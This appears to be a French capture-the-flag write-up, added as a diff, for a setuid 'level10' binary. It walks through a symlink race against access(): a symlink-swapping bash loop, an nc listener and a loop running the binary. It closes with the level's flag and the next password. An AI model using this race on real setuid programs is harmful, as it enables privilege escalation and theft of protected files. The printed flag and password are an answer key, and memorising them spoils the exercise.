@@ -1,0 +1,62 @@
+On commence avec un programme "level10" et un fichier "token" :
+
+    -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+    -rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+
+On utilise un decompilateur (Dogbolt) pour comprendre comment est code level10 :
+Il s'agit d'un programme qui envoie le contenu d'un fichier vers un hote distant
+via un socket TCP, le sur port 6969. Il attend "./level10 file host".
+
+    iVar2 = access(argv[1],4);
+    if (iVar2 == 0) {
+        (...)
+        iVar2 = socket(2,1,0); // cree un socket IPv4 TCP
+        (...)
+        local_24.sa_family = 2; // AF_INET
+        local_24.sa_data._2_4_ = inet_addr(__cp);
+        uVar1 = htons(0x1b39); // port 6969
+        local_24.sa_data._0_2_ = uVar1;
+        (...)
+        connect(sock, &addr, 16);
+        (...)
+        iVar3 = open(pcVar6, 0); // lit le fichier
+        __n = read(iVar3, local_1024, 0x1000);
+        (...)
+        write(sock, local_1024, __n); // envoie les donnees au serv
+        (...)
+    }
+
+
+Pour l'instant, le programme bloque a cette ligne :
+    iVar2 = access(argv[1], 4);
+
+Access() utilise les droits obligatoirement les droits de l'user (level10),
+pour lire token (flag10). Un lien symbolique ne passera pas non plus a cause d'access().
+C'est le plus gros element bloquant, car si on reussit a lancer access(), il va rentrer dans
+la condition et ouvrir le fichier puis envoyer les donnees (si ceux-ci sont ok evidemment)
+
+On va faire un "race condition" : une attaque qui exploite le timing de l'envoi simultane de plusieurs requetes.
+Dans notre cas, on va donner en argument un lien symbolique pointant vers un fichier (random)
+dont on a les droits (level10), puis juste apres, modifier le lien symbolique pour qu'il pointe vers token.
+Si tout se passe bien, on va pouvoir passer access() avec random, puis avant qu'il n'ai le temps de verifier
+a nouveau les droits, on enverra les donnees de token.
+
+
+Pour faire ca, on va commencer par preparer les fichiers dont on aura besoin :
+    echo bonjour > /tmp/random && chmod 777 /tmp/random
+
+Ensuite, on va ouvrir 3 terminaux en ssh :
+-> Un pour lancer une boucle bash, qui va changer le lien symbolique en boucle :
+    while true; do ln -sf /tmp/random /tmp/tok2; ln -sf /home/user/level10/token /tmp/tok2; done
+
+-> Un pour ecouter sur le port 6969, et recevoir les reponses en continue en utilisant netcat :
+    nc -lk 6969
+
+-> Un dernier pour lancer une boucle bash, qui va executer level10 en boucle jusqu'a ce qu'on obtienne le flag :
+    while true; do ./level10 /tmp/tok2 127.0.0.1; done
+
+
+
+flag10 : woupa2yuojeeaaed06riuj63c
+Password11 : feulo4b72j7edeahuete3no7c
